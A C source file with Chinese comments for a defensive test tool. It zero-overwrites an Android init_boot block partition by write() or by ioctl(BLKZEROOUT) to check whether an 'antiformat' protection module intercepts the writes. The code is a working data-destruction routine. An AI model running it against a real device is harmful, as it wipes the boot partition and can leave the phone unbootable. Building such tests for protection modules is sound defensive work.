/*
 * zero_initboot.c - 模拟"恶意 ELF"对 init_boot 分区做 zero 覆盖
 *
 * 用于测试 antiformat 模块的拦截能力。
 * 支持两种攻击手法:
 *   1) write:      open(O_WRONLY) + write(全0)        -> 测 block_write/fd_is_protected
 *   2) ioctl:      open + ioctl(BLKZEROOUT)           -> 测 block_ioctl/fd_is_blockdev
 *
 * 用 aarch64-linux-gnu-gcc 交叉编译，静态链接，可直接在 Android 上运行。
 *
 * 编译:
 *   aarch64-linux-gnu-gcc -static -O2 -o zero_initboot zero_initboot.c
 *
 * 注意: 本工具仅用于授权环境下的防护功能测试，请保留 init_boot 备份!
 *
 * License: GPL v2
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>

/* BLKZEROOUT = _IOW(0x12, 127, uint64_t[2]) = 0x127F (与内核一致) */
#ifndef BLKZEROOUT
#define BLKZEROOUT _IOW(0x12, 127, unsigned long long[2])
#endif

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s <bdev> <write|ioctl> [size_bytes]\n", prog);
	fprintf(stderr, "  <bdev>      要覆盖的块设备路径, 如 /dev/block/by-name/init_boot_b\n");
	fprintf(stderr, "  <write|ioctl> 攻击方式\n");
	fprintf(stderr, "  [size_bytes] write模式下的覆盖字节数 (默认整盘)\n");
	exit(1);
}

int main(int argc, char **argv)
{
	const char *path;
	const char *mode;
	int fd;
	ssize_t n;
	unsigned long sz;

	if (argc < 3)
		usage(argv[0]);

	path = argv[1];
	mode = argv[2];
	sz = 0x800000; /* 默认 8MB = init_boot 大小 */

	if (argc >= 4)
		sz = strtoul(argv[3], NULL, 0);

	fd = open(path, O_WRONLY);
	if (fd < 0) {
		fprintf(stderr, "[zero] open(%s) failed: %s (errno=%d)\n",
			path, strerror(errno), errno);
		return 2;
	}
	fprintf(stderr, "[zero] open(%s) OK, fd=%d, mode=%s\n", path, fd, mode);

	if (strcmp(mode, "write") == 0) {
		/* 攻击手法 1: 直接 write 一大块 0 */
		size_t chunk = 4096;
		unsigned char *buf = malloc(chunk);
		if (!buf) { perror("malloc"); close(fd); return 3; }
		memset(buf, 0, chunk);

		size_t total = 0;
		while (total < sz) {
			size_t this = (sz - total < chunk) ? (sz - total) : chunk;
			n = write(fd, buf, this);
			if (n < 0) {
				fprintf(stderr, "[zero] write() failed at offset %zu: %s (errno=%d)\n",
					total, strerror(errno), errno);
				free(buf); close(fd);
				return 4; /* 被拦截, 返回 4 */
			}
			total += n;
		}
		fprintf(stderr, "[zero] write: 已写入 %zu bytes (未被拦截)\n", total);
		free(buf);
	} else if (strcmp(mode, "ioctl") == 0) {
		/* 攻击手法 2: BLKZEROOUT 一次性清零 */
		unsigned long long range[2];
		range[0] = 0;
		range[1] = sz;
		if (ioctl(fd, BLKZEROOUT, range) < 0) {
			fprintf(stderr, "[zero] ioctl(BLKZEROOUT) failed: %s (errno=%d)\n",
				strerror(errno), errno);
			close(fd);
			return 5; /* 被拦截, 返回 5 */
		}
		fprintf(stderr, "[zero] ioctl(BLKZEROOUT): 已清零 %lu bytes (未被拦截)\n", sz);
	} else {
		usage(argv[0]);
	}

	close(fd);
	return 0; /* 完全没有被拦截, 破坏成功 */
}